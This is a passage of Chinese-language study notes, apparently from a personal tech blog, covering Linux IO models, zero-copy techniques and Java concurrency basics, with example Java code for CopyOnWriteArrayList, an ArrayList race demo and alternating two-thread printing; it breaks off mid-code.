<p>IO多路复用模型，建立在操作系统kernel内核能够提供的多路复用系统调用select&#x2F;poll&#x2F;epoll基础之上的。多路复用IO需要用到两个系统调用（system call）， 一个select&#x2F;poll&#x2F;epoll查询调用，一个是IO的读取调用。</p>
<p>和NIO模型相似，多路复用IO需要轮询。负责select&#x2F;poll&#x2F;epoll查询调用的线程，需要不断的进行select&#x2F;epoll轮询，查找出可以进行IO操作的连接。</p>
<p>另外，多路复用IO模型与前面的NIO模型，是有关系的。对于每一个可以查询的socket，一般都设置成为non-blocking模型。只是这一点，对于用户程序是透明的（不感知）。</p>
<p>多路复用IO的优点：</p>
<p>用select&#x2F;poll&#x2F;epoll的优势在于，它可以同时处理成千上万个连接（connection）。与一条线程维护一个连接相比，I&#x2F;O多路复用技术的最大优势是：系统不必创建线程，也不必维护这些线程，从而大大减小了系统的开销。</p>
<p>Java的NIO（new IO）技术，使用的就是IO多路复用模型。在linux系统上，使用的是epoll系统调用。</p>
<p>多路复用IO的缺点：</p>
<p>本质上，select&#x2F;poll&#x2F;epoll系统调用，属于同步IO，也是阻塞IO。都需要在读写事件就绪后，自己负责进行读写，也就是说这个读写过程是阻塞的。</p>
<p>如何充分的解除线程的阻塞呢？那就是异步IO模型。</p>
<h3 id="异步IO模型（asynchronous-IO）"><a href="#异步IO模型（asynchronous-IO）" class="headerlink" title="异步IO模型（asynchronous IO）"></a>异步IO模型（asynchronous IO）</h3><p>如何进一步提升效率，解除最后一点阻塞呢？这就是异步IO模型，全称asynchronous I&#x2F;O，简称为AIO。</p>
<p>AIO的基本流程是：用户线程通过系统调用，告知kernel内核启动某个IO操作，用户线程返回。kernel内核在整个IO操作（包括数据准备、数据复制）完成后，通知用户程序，用户执行后续的业务操作。</p>
<p>kernel的数据准备是将数据从网络物理设备（网卡）读取到内核缓冲区；kernel的数据复制是将数据从内核缓冲区拷贝到用户程序空间的缓冲区。</p>
<p>[<img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848327.jpeg" alt="在这里插入图片描述"></p>
<p>（1）当用户线程调用了read系统调用，立刻就可以开始去做其它的事，用户线程不阻塞。</p>
<p>（2）内核（kernel）就开始了IO的第一个阶段：准备数据。当kernel一直等到数据准备好了，它就会将数据从kernel内核缓冲区，拷贝到用户缓冲区（用户内存）。</p>
<p>（3）kernel会给用户线程发送一个信号（signal），或者回调用户线程注册的回调接口，告诉用户线程read操作完成了。</p>
<p>（4）用户线程读取用户缓冲区的数据，完成后续的业务操作。</p>
<p>异步IO模型的特点：</p>
<p>在内核kernel的等待数据和复制数据的两个阶段，用户线程都不是block(阻塞)的。用户线程需要接受kernel的IO操作完成的事件，或者说注册IO操作完成的回调函数，到操作系统的内核。所以说，异步IO有的时候，也叫做信号驱动 IO 。</p>
<p>异步IO模型缺点：</p>
<p>需要完成事件的注册与传递，这里边需要底层操作系统提供大量的支持，去做大量的工作。</p>
<p>目前来说， Windows 系统下通过 IOCP 实现了真正的异步 I&#x2F;O。但是，就目前的业界形式来说，Windows 系统，很少作为百万级以上或者说高并发应用的服务器操作系统来使用。</p>
<p>而在 Linux 系统下，异步IO模型在2.6版本才引入，目前并不完善。所以，这也是在Linux下，实现高并发网络编程时都是以 IO 复用模型模式为主。</p>
<h3 id="小结一下："><a href="#小结一下：" class="headerlink" title="小结一下："></a>小结一下：</h3><p>四种IO模型，理论上越往后，阻塞越少，效率也是最优。在这四种 I&#x2F;O 模型中，前三种属于同步 I&#x2F;O，因为其中真正的 I&#x2F;O 操作将阻塞线程。只有最后一种，才是真正的异步 I&#x2F;O 模型，可惜目前Linux 操作系统尚欠完善。</p>
<h2 id="零拷贝"><a href="#零拷贝" class="headerlink" title="零拷贝"></a>零拷贝</h2><h4 id="1-传统-I-x2F-O"><a href="#1-传统-I-x2F-O" class="headerlink" title="1. 传统 I&#x2F;O"></a>1. 传统 I&#x2F;O</h4><p>先来看看传统方式，在进行一次读写时共涉及了4次上下文切换，2次 DMA 拷贝以及2次 CPU 拷贝。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848345.png" alt="screen-1535441"></p>
<h4 id="2-用户态直接IO"><a href="#2-用户态直接IO" class="headerlink" title="2. 用户态直接IO"></a>2. 用户态直接IO</h4><p>这是第一种思路，使应用进程或处于用户态下的库函数跨过内核直接访问硬件，内核在数据传输过程除了进行必要的虚拟存储配置工作外，不参与任何其他工作。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848347.png" alt="screen-1535947"></p>
<p>但只适用于不需要内核缓冲区处理的应用程序，这些应用程序通常在进程地址空间有自己的数据缓存机制，又称为自缓存应用程序，如数据库管理系统。其次，因 CPU 和磁盘 I&#x2F;O 之间的性能差距，就会造成资源的浪费，一般是会配合异步 I&#x2F;O 使用。</p>
<h4 id="3-mmap"><a href="#3-mmap" class="headerlink" title="3. mmap"></a>3. mmap</h4><p>这属于第二类优化，减少了 1 次 CPU 拷贝。MMAP 是数据不会到达用户空间内存，只会存在于系统空间的内存上，用户空间与系统空间共用同一个缓冲区，两者通过映射关联。<img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848464.png" alt="screen-1773287"></p>
<p>整个 MMAP 过程，发生了 4 次上下文切换 + 1 次 CPU 拷贝 + 2 次 DMA 拷贝。</p>
<h4 id="4-sendfile"><a href="#4-sendfile" class="headerlink" title="4. sendfile"></a>4. sendfile</h4><p>这也是第二类优化。用户进程不需要单独调用 read&#x2F;write ，而是直接调用 sendfile() ，sendfile 再帮用户调用 read&#x2F;write 操作。数据可以直接在内核空间进行 I&#x2F;O 传输，省去了数据在用户空间和内核空间之间的拷贝。</p>
<p>与 mmap 内存映射方式不同的是， sendfile() 调用中数据对用户空间是完全不可见的。也就是说，这是一次完全意义上的数据传输过程。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848624.png" alt="image-20200610154454498"></p>
<p>整个过程发生 2 次上下文切换，1 次 CPU 拷贝和 2 次 DMA 拷贝。</p>
<h4 id="5-sendfile-DMA-gather-copy"><a href="#5-sendfile-DMA-gather-copy" class="headerlink" title="5. sendfile + DMA gather copy"></a>5. sendfile + DMA gather copy</h4><p>在前面的 sendfile() 方式中，CPU 仍需要一次拷贝，从 Linux 2.4 版本开始，DMA 自带了收集功能，可以将对应的数据描述信息（内存地址、地址偏移量）记录到相应的网络缓冲区（ socket buffer），由DMA 根据这些信息直接将内核缓冲区的数据拷贝到网卡设备中，省下了最后一次 CPU 拷贝。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848672.png" alt="image-20200610154613272"></p>
<p>这次只发生 2 次上下文切换 + 2 次 DMA 数据拷贝。</p>
<h4 id="6-splice"><a href="#6-splice" class="headerlink" title="6. splice"></a>6. splice</h4><p>sendfile 只适用于将数据从文件拷贝到网卡上，限定了使用范围。</p>
<p>splice 系统调用可以在内核空间的读缓冲区和网络缓冲区之间建立管道，支持任意两个文件之间互连，可以在操作系统地址空间中整块地移动数据。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848689.png" alt="image-20200610161033841"></p>
<p>同样发生 2 次上下文切换 + 2 次 DMA 数据拷贝。</p>
<h4 id="7-写时复制"><a href="#7-写时复制" class="headerlink" title="7. 写时复制"></a>7. 写时复制</h4><p>这个就是第三种思路了，COW 写时复制。</p>
<p>当用户进程有写操作时，就把这块共享的内存空间复制一份到其他区域，给写进程专用。这种方法在能够降低系统开销，如果某个进程永远不会对数据进行更改，那就永远不需要拷贝。</p>
<h1 id="并发"><a href="#并发" class="headerlink" title="并发"></a>并发</h1><h2 id="进程和线程"><a href="#进程和线程" class="headerlink" title="进程和线程"></a>进程和线程</h2><p>进程: 进程是程序的一次执行过程，是系统运行程序的基本单位，因此进程是动态的。系统运行一个程序即是一个进程从创建，运行到消亡的过程。在 Java 中，当我们启动 main 函数时其实就是启动了一个 JVM 的进程，而 main 函数所在的线程就是这个进程中的一个线程，也称主线程; 启动两个main函数就是两个jvm进程;</p>
<p>线程: 线程与进程相似，但线程是一个比进程更小的执行单位。一个进程在其执行的过程中可以产生多个线程。与进程不同的是同类的多个线程共享进程的<strong>堆</strong>和<strong>方法区</strong>资源，但每个线程有自己的<strong>程序计数器</strong>、<strong>虚拟机栈</strong>和<strong>本地方法栈</strong>，所以系统在产生一个线程，或是在各个线程之间作切换工作时，负担要比进程小得多，也正因为如此，线程也被称为轻量级进程。</p>
<ul>
<li>计算机的核心是CPU，它承担了所有的计算任务。它就像一座工厂，时刻在运行。</li>
<li>假定工厂的电力有限，一次只能供给一个车间使用。也就是说，一个车间开工的时候，其他车间都必须停工。背后的含义就是，单个CPU一次只能运行一个任务。编者注: 多核的CPU就像有了多个发电厂，使多工厂(多进程)实现可能。</li>
<li>进程就好比工厂的车间，它代表CPU所能处理的单个任务。任一时刻，CPU总是运行一个进程，其他进程处于非运行状态。（子进程就是工厂的复制版， 各个工厂独立，一般互不影响）</li>
<li>一个车间里（可能只有一台机器），可以有很多工人。他们协同完成一个任务。（由于是流水线工作，一个线程挂了很可能会影响到整个进程，每个工人有自己的独有区域，不能给别人访问）</li>
<li>线程就好比车间里的工人。一个进程可以包括多个线程。</li>
<li>车间的空间是工人们共享的，比如许多房间是每个工人都可以进出的。这象征一个进程的内存空间是共享的，每个线程都可以使用这些共享内存。</li>
<li>可是，每间房间的大小不同，有些房间最多只能容纳一个人，比如厕所。里面有人的时候，其他人就不能进去了。这代表一个线程使用某些共享内存时，其他线程必须等它结束，才能使用这一块内存。</li>
<li>一个防止他人进入的简单方法，就是门口加一把锁。先到的人锁上门，后到的人看到上锁，就在门口排队，等锁打开再进去。这就叫”互斥锁”（Mutual exclusion，缩写 Mutex），防止多个线程同时读写某一块内存区域。</li>
<li>还有些房间，可以同时容纳n个人，比如厨房。也就是说，如果人数大于n，多出来的人只能在外面等着。这好比某些内存区域，只能供给固定数目的线程使用。</li>
<li>这时的解决方法，就是在门口挂n把钥匙。进去的人就取一把钥匙，出来时再把钥匙挂回原处。后到的人发现钥匙架空了，就知道必须在门口排队等着了。这种做法叫做”信号量”（Semaphore），用来保证多个线程不会互相冲突。</li>
<li>不难看出，mutex是semaphore的一种特殊情况（n&#x3D;1时）。也就是说，完全可以用后者替代前者。但是，因为mutex较为简单，且效率高，所以在必须保证资源独占的情况下，还是采用这种设计。</li>
</ul>
<h3 id="多进程编程和多线程编程的优缺点"><a href="#多进程编程和多线程编程的优缺点" class="headerlink" title="多进程编程和多线程编程的优缺点"></a>多进程编程和多线程编程的优缺点</h3><p>多进程编程和多线程编程，都可以使用并行机制来提升系统的运行效率。二者的区别在于运行时所占的内存分布不同，多线程是共用一套内存的代码块区间；而多进程是各用一套独立的内存区间。</p>
<p>多进程的优点是稳定性好，一个子进程崩溃了，不会影响主进程以及其余进程。基于这个特性，常常会用多进程来实现守护服务器的功能。</p>
<p>多进程编程也有不足，即创建进程的代价非常大，因为操作系统要给每个进程分配固定的资源，并且操作系统对进程的总数会有一定的限制，若进程过多，操作系统调度都会存在问题，会造成假死状态。</p>
<p>多线程编程的优点是效率较高一些，适用于批处理任务等功能；不足之处在于，任何一个线程崩溃都可能造成整个进程的崩溃，因为它们共享了进程的内存资源池。</p>
<p>既然多线程编程和多进程编程各有优缺点，因此它们分别适用于不同的场景。比如说（python），对于计算密集型的任务，多进程效率会更高一下；而对于IO密集型的任务（比如文件操作，网络爬虫），采用多线程编程效率更高。为什么是这样呢？</p>
<p>其实也不难理解。对于 IO 密集型操作，大部分消耗时间其实是等待时间，在等待时间中，<a href="http://c.biancheng.net/python/">Python</a>会释放GIL供新的线程使用，实现了线程间的切换；相反对于 CPU 密集型代码，2 个 CPU 干活肯定比一个 CPU 快很多。</p>
<p>Python，特指CPython的实现，由于GIL的存在，CPython不能有效的利用多核处理器。表现为任意时间一个进程只有一个线程在跑，而IO密集型运算，多数是在IO读写将线程堵塞掉了，这个时候线程切换是很合理的，反正线程只是单纯地等待，在这个等待的时候去做其他的事情，资源利用率就上去了。</p>
<p>在大型的计算机集群系统中，通常都会将多进程程序分布运行在不同的计算机上协同工作。而每一台计算机上的进程内部，又会由多个线程来并行工作。</p>
<p>注意，对于任务数来说，无论是多进程编程或者多线程编程，其进程数或线程数都不能太多：</p>
<ul>
<li>对于多进程编程来说，操作系统在切换任务时，会有一系列的保护现场措施，这要花费相当多的系统资源，若任务过多，则大部分资源都被用做干这些了，结果就是所有任务都做不好；</li>
<li>多线程编程也不是线程个数越多效率越高，通过下面的公式可以计算出线程数量最优的一个参考值。</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848694.gif" alt="img"></p>
<h3 id="线程的生命周期和状态"><a href="#线程的生命周期和状态" class="headerlink" title="线程的生命周期和状态?"></a>线程的生命周期和状态?</h3><p>new,runnable(就绪和运行),blocked,waiting,time_waiting, terminated; </p>
<h3 id="线程死锁的四个必要条件"><a href="#线程死锁的四个必要条件" class="headerlink" title="线程死锁的四个必要条件?"></a>线程死锁的四个必要条件?</h3><p>互斥,请求和保持,不可剥夺,循环等待;</p>
<h3 id="死锁处理方案"><a href="#死锁处理方案" class="headerlink" title="死锁处理方案?"></a>死锁处理方案?</h3><p>破坏4个必要条件;银行家算法;死锁的检测与恢复;</p>
<h3 id="sleep-和wait"><a href="#sleep-和wait" class="headerlink" title="sleep()和wait()"></a>sleep()和wait()</h3><p>sleep()不释放锁,wait()释放锁;wait()用于线程间交互&#x2F;通信,sleep用于暂停执行;wait需要别的对象调用同一对象上的notify()和notifyAll()或者使用wait(long timeout)自动苏醒;</p>
<h3 id="Start-和Run"><a href="#Start-和Run" class="headerlink" title="Start()和Run()"></a>Start()和Run()</h3><p>new 一个 Thread，线程进入了新建状态。调用 start()方法，会启动一个线程并使线程进入了就绪状态，当分配到时间片后就可以开始运行了。 start() 会执行线程的相应准备工作，然后自动执行 run() 方法的内容，这是真正的多线程工作。 但是，直接执行 run() 方法，会把 run() 方法当成一个 main 线程下的普通方法去执行，并不会在某个线程中执行它，所以这并不是多线程工作。</p>
<h4 id="创建线程的3种方式"><a href="#创建线程的3种方式" class="headerlink" title="创建线程的3种方式"></a>创建线程的3种方式</h4><ul>
<li><p>继承thread类,重写run方法,调用start()开启线程,不建议使用,避免oop(object-oriented programming)单继承局限性; Thread类也实现了Runable接口，Thread类里面的start方法调用native的start方法，也就是有操作系统来创建线程。</p>
</li>
<li><p>实现runnable接口,重写run方法, new Thread(p).start() (推荐);避免单继承局限性,灵活方便,方便同一个对象被多个线程使用，（用到了代理模式）,这里可以使用匿名内部类</p>
</li>
<li><p>实现Callable接口</p>
</li>
</ul>
<p>（1）创建Callable接口的实现类，并实现call()方法，该call()方法将作为线程执行体，并且有返回值。</p>
<p>（2）创建Callable实现类的实例，使用FutureTask(实现RunnableFutrue接口， 这个接口有继承Runnable接口)类来包装Callable对象，该FutureTask对象封装了该Callable对象的call()方法的返回值。</p>
<p>（3）使用FutureTask对象作为Thread对象的target创建并启动新线程。</p>
<p>（4）调用FutureTask对象的get()方法来获得子线程执行结束后的返回值</p>
<h3 id="停止线程"><a href="#停止线程" class="headerlink" title="停止线程"></a>停止线程</h3><p>不推荐使用jdk提供的stop()和destroy()方法; 推荐线程自己停下来, 使用一个标志位来终止; </p>
<p>Yield()礼让但不一定成功,让出cpu然后重新竞争; join (底层是wait方法, 每个线程退出的时候会调用notofyAll()(优先级高的优先被调度)方法，通知所有等待在该线程对象上的线程)会让自己停下来,等被自己插队的那个线程执行完才执行自己;</p>
<h3 id="CopyOnWriteArrayList（COW）"><a href="#CopyOnWriteArrayList（COW）" class="headerlink" title="CopyOnWriteArrayList（COW）"></a>CopyOnWriteArrayList（COW）</h3><p>concurrentModificationException 并发修改异常</p>
<p>vector是安全的； Collections.synchronizedList(); 使用JUC下的CopyOnWriteArrayList；</p>
<p>cow ： 在写入时候避免覆盖，造成数据问题；cow实现在jdk8之后的版本改成了synchronized，比lock更高效；</p>
<p>多线程同时写也不会出问题, 使用volatile修饰, 使用了reentrantlock</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// jdk 8</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">transient</span> <span class="keyword">volatile</span> Object[] array;</span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">add</span><span class="params">(E e)</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">ReentrantLock</span> <span class="variable">lock</span> <span class="operator">=</span> <span class="built_in">this</span>.lock;</span><br><span class="line">        lock.lock();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Object[] elements = getArray();</span><br><span class="line">            <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> elements.length;</span><br><span class="line">            <span class="comment">// 复制一份</span></span><br><span class="line">            Object[] newElements = Arrays.copyOf(elements, len + <span class="number">1</span>);</span><br><span class="line">            newElements[len] = e;</span><br><span class="line">            setArray(newElements);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            lock.unlock();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="Fail-fast-快速失败-和-fail-safe-安全失败"><a href="#Fail-fast-快速失败-和-fail-safe-安全失败" class="headerlink" title="Fail-fast(快速失败) 和 fail-safe(安全失败)"></a>Fail-fast(快速失败) 和 fail-safe(安全失败)</h3><p>fail-safe允许在遍历的过程中对容器中的数据进行修改，而fail-fast则不允许。</p>
<p> <strong>fail-fast ( 快速失败 )</strong></p>
<p>fail-fast:直接在容器上进行遍历，在遍历过程中，一旦发现容器中的数据被修改了，会立刻抛出ConcurrentModificationException异常导致遍历失败。java.util包下的集合类都是快速失败机制的, 常见的的使用fail-fast方式遍历的容器有HashMap和ArrayList等。</p>
<p>在使用迭代器遍历一个集合对象时,比如增强for,如果遍历过程中对集合对象的内容进行了修改(增删改),会抛出ConcurrentModificationException 异常.</p>
<p>fail-fast的出现场景<br>在我们常见的java集合中就可能出现fail-fast机制,比如ArrayList，HashMap。在多线程和单线程环境下都有可能出现快速失败。</p>
<p>避免fail-fast的方法：</p>
<p>方法1</p>
<p>在单线程的遍历过程中，如果要进行remove操作，可以调用迭代器的remove方法而不是集合类的remove方法</p>
<p>方法2</p>
<p>使用fail-safe机制，使用java并发包(java.util.concurrent)中的CopyOnWriterArrayList类来代替ArrayList，使用 ConcurrentHashMap来代替hashMap。</p>
<p><strong>fail-safe ( 安全失败 )</strong><br>fail-safe:这种遍历基于容器的一个克隆。因此，对容器内容的修改不影响遍历。java.util.concurrent包下的容器都是安全失败的,可以在多线程下并发使用,并发修改。常见的的使用fail-safe方式遍历的容器有ConcerrentHashMap和CopyOnWriteArrayList等。</p>
<p>原理：</p>
<p>采用安全失败机制的集合容器，在遍历时不是直接在集合内容上访问的，而是先复制原有集合内容，在拷贝的集合上进行遍历。由于迭代时是对原集合的拷贝进行遍历，所以在遍历过程中对原集合所作的修改并不能被迭代器检测到，所以不会触发Concurrent Modification Exception。</p>
<p>缺点：基于拷贝内容的优点是避免了Concurrent Modification Exception，但同样地，迭代器并不能访问到修改后的内容，即：迭代器遍历的是开始遍历那一刻拿到的集合拷贝，在遍历期间原集合发生的修改迭代器是不知道的。</p>
<h3 id="concurrentModificationException-并发修改异常"><a href="#concurrentModificationException-并发修改异常" class="headerlink" title="concurrentModificationException 并发修改异常"></a>concurrentModificationException 并发修改异常</h3><p>在并发情况下，多个线程同时读写可能会报这个异常</p>
<p>vector是安全的； Collections.synchronizedList(); 使用JUC下的CopyOnWriteArrayList；</p>
<p>cow ： 在写入时候避免覆盖，造成数据问题；cow后面改成了synchronized，比lock更高效；</p>
<h3 id="ArrayIndexOutOfBoundsException"><a href="#ArrayIndexOutOfBoundsException" class="headerlink" title="ArrayIndexOutOfBoundsException"></a>ArrayIndexOutOfBoundsException</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> syn;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.UUID;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Huang Mingwang</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span> 2021-04-25 9:37 上午</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestArrayList</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        ArrayList&lt;String&gt; strings = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">101</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Thread</span>(()-&gt;&#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i1</span> <span class="operator">=</span> <span class="number">0</span>; i1 &lt; <span class="number">20</span>; i1++) &#123;</span><br><span class="line">                    strings.add(UUID.randomUUID().toString().substring(<span class="number">0</span>,<span class="number">5</span>));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;).start();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">        System.out.println(strings.size());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="CopyOnWriteSet"><a href="#CopyOnWriteSet" class="headerlink" title="CopyOnWriteSet"></a>CopyOnWriteSet</h3><p>collections.synchronizedSet(); </p>
<h3 id="两个线程交替打印1-100"><a href="#两个线程交替打印1-100" class="headerlink" title="两个线程交替打印1-100"></a>两个线程交替打印1-100</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * synchronized实现</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">doSynchronized1</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Number</span> <span class="variable">number</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Number</span>();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            number.odd();</span><br><span class="line">        &#125;, <span class="string">&quot;odd&quot;</span>).start();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            number.even();</span><br><span class="line">        &#125;).start();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Number</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">TOTAL</span> <span class="operator">=</span> <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">even</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> (i &lt;= TOTAL) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;i=&quot;</span> + i++);</span><br><span class="line">                <span class="built_in">this</span>.notify();</span><br><span class="line">                System.out.println(<span class="string">&quot;偶数打印完毕，释放锁&quot;</span>);</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;偶数锁等待&quot;</span>);</span><br><span class="line">                    <span class="built_in">this</span>.wait();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">odd</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> (i &lt;= TOTAL) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">1</span>) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;i=&quot;</span> + i++);</span><br><span class="line">                <span class="built_in">this</span>.notify();</span><br><span class="line">                System.out.println(<span class="string">&quot;奇数打印完毕，释放锁&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;奇数锁等待&quot;</span>);</span><br><span class="line"></span><br><span class="line">                    <span class="built_in">this</span>.wait();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * lock实现</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">doLock</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Number2</span> <span class="variable">number2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Number2</span>();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            number2.odd();</span><br><span class="line">        &#125;, <span class="string">&quot;odd&quot;</span>).start();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            number2.even();</span><br><span class="line">        &#125;, <span class="string">&quot;even&quot;</span>).start();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Number2</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">TOTAL</span> <span class="operator">=</span> <span class="number">100</span>;</span><br><span class="line">    <span class="type">Lock</span> <span class="variable">lock</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReentrantLock</span>();</span><br><span class="line">    <span class="type">Condition</span> <span class="variable">condition</span> <span class="operator">=</span> lock.newCondition();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">even</span><span class="params">()</span> &#123;</span><br><span class="line">        lock.lock();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">while</span> (i &lt;= TOTAL) &#123;</span><br><span class="line">                <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;i=&quot;</span> + i++);</span><br><span class="line">                    condition.signal();</span><br><span class="line">                    System.out.println(<span class="string">&quot;偶数打印完毕，释放锁&quot;</span>);</span><br><span class="line"></span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        System.out.println(<span class="string">&quot;偶数锁等待&quot;</span>);</span><br><span class="line">                        condition.await();</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            lock.unlock();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">odd</span><span class="params">()</span> &#123;</span><br><span class="line">        lock.lock();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">while</span> (i &lt;= TOTAL) &#123;</span><br><span class="line">                <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">1</span>) &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;i=&quot;</span> + i++);</span><br><span class="line">                    condition.signal();</span><br><span class="line">                    System.out.println(<span class="string">&quot;奇数打印完毕，释放锁&quot;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        System.out.println(<span class="string">&quot;奇数锁等待&quot;</span>);</span><br><span class="line">                        condition.await();</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            lock.unlock();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span 